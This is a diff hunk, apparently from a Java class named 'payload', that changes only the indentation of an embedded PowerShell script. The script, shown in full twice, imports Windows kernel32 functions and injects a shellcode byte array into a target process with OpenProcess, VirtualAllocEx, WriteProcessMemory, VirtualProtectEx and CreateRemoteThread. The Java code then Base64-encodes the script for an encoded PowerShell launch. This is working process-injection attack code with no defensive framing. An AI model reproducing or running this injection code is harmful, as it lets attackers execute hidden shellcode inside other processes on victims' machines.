@@ -76,42 +76,42 @@ public class payload {
 
                 // Call Win32 APIs via PowerShell
                 String psScript = 
-                "$Kernel32 = @'\n" +
-                "[DllImport(\"kernel32.dll\")]\n" +
-                "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);\n" +
-                "[DllImport(\"kernel32.dll\")]\n" +
-                "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n" +
-                "[DllImport(\"kernel32.dll\")]\n" +
-                "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);\n" +
-                "[DllImport(\"kernel32.dll\")]\n" +
-                "public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);\n" +
-                "[DllImport(\"kernel32.dll\")]\n" +
-                "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n" +
-                "'@\n" +
-                "$WinAPI = Add-Type -MemberDefinition $Kernel32 -Name \"Win32API\" -Namespace \"Win32RemoteSC\" -PassThru\n" +
-                "\n" +
-                "[byte[]]$sc = @(" + sb.toString() + ")\n" +
-                "$nShellcodeSize = $sc.Length\n" +
-                "\n" +
-                "# OpenProcess (PROCESS_ALL_ACCESS = 0x001F0FFF)\n" +
-                "$procHandle = $WinAPI::OpenProcess(0x001F0FFF, $false, " + nPid + ")\n" +
-                "if ($procHandle -eq [IntPtr]::Zero) { exit }\n" +
-                "\n" +
-                "# VirtualAllocEx (MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40)\n" +
-                "$init = $WinAPI::VirtualAllocEx($procHandle, [IntPtr]::Zero, $nShellcodeSize, 0x1000, 0x40)\n" +
-                "if ($init -ne [IntPtr]::Zero) {\n" +
-                "    $bytesWritten = 0\n" +
-                "    # WriteProcessMemory\n" +
-                "    $success = $WinAPI::WriteProcessMemory($procHandle, $init, $sc, $nShellcodeSize, [ref]$bytesWritten)\n" +
-                "    if ($success -and $bytesWritten -gt 0) {\n" +
-                "        # VirtualProtectEx (PAGE_EXECUTE_READ = 0x20)\n" +
-                "        $oldProtect = 0\n" +
-                "        $WinAPI::VirtualProtectEx($procHandle, $init, $nShellcodeSize, 0x20, [ref]$oldProtect) | Out-Null\n" +
-                "        \n" +
-                "        # CreateRemoteThread\n" +
-                "        $WinAPI::CreateRemoteThread($procHandle, [IntPtr]::Zero, 0, $init, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null\n" +
-                "    }\n" +
-                "}\n";
+                    "$Kernel32 = @'\n" +
+                    "[DllImport(\"kernel32.dll\")]\n" +
+                    "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);\n" +
+                    "[DllImport(\"kernel32.dll\")]\n" +
+                    "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n" +
+                    "[DllImport(\"kernel32.dll\")]\n" +
+                    "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);\n" +
+                    "[DllImport(\"kernel32.dll\")]\n" +
+                    "public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);\n" +
+                    "[DllImport(\"kernel32.dll\")]\n" +
+                    "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n" +
+                    "'@\n" +
+                    "$WinAPI = Add-Type -MemberDefinition $Kernel32 -Name \"Win32API\" -Namespace \"Win32RemoteSC\" -PassThru\n" +
+                    "\n" +
+                    "[byte[]]$sc = @(" + sb.toString() + ")\n" +
+                    "$nShellcodeSize = $sc.Length\n" +
+                    "\n" +
+                    "# OpenProcess (PROCESS_ALL_ACCESS = 0x001F0FFF)\n" +
+                    "$procHandle = $WinAPI::OpenProcess(0x001F0FFF, $false, " + nPid + ")\n" +
+                    "if ($procHandle -eq [IntPtr]::Zero) { exit }\n" +
+                    "\n" +
+                    "# VirtualAllocEx (MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40)\n" +
+                    "$init = $WinAPI::VirtualAllocEx($procHandle, [IntPtr]::Zero, $nShellcodeSize, 0x1000, 0x40)\n" +
+                    "if ($init -ne [IntPtr]::Zero) {\n" +
+                    "    $bytesWritten = 0\n" +
+                    "    # WriteProcessMemory\n" +
+                    "    $success = $WinAPI::WriteProcessMemory($procHandle, $init, $sc, $nShellcodeSize, [ref]$bytesWritten)\n" +
+                    "    if ($success -and $bytesWritten -gt 0) {\n" +
+                    "        # VirtualProtectEx (PAGE_EXECUTE_READ = 0x20)\n" +
+                    "        $oldProtect = 0\n" +
+                    "        $WinAPI::VirtualProtectEx($procHandle, $init, $nShellcodeSize, 0x20, [ref]$oldProtect) | Out-Null\n" +
+                    "        \n" +
+                    "        # CreateRemoteThread\n" +
+                    "        $WinAPI::CreateRemoteThread($procHandle, [IntPtr]::Zero, 0, $init, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null\n" +
+                    "    }\n" +
+                    "}\n";
 
                 byte[] abUTF16Bytes = psScript.getBytes("UTF-16LE");
                 String szB64 = Base64.getEncoder().encodeToString(abUTF16Bytes);
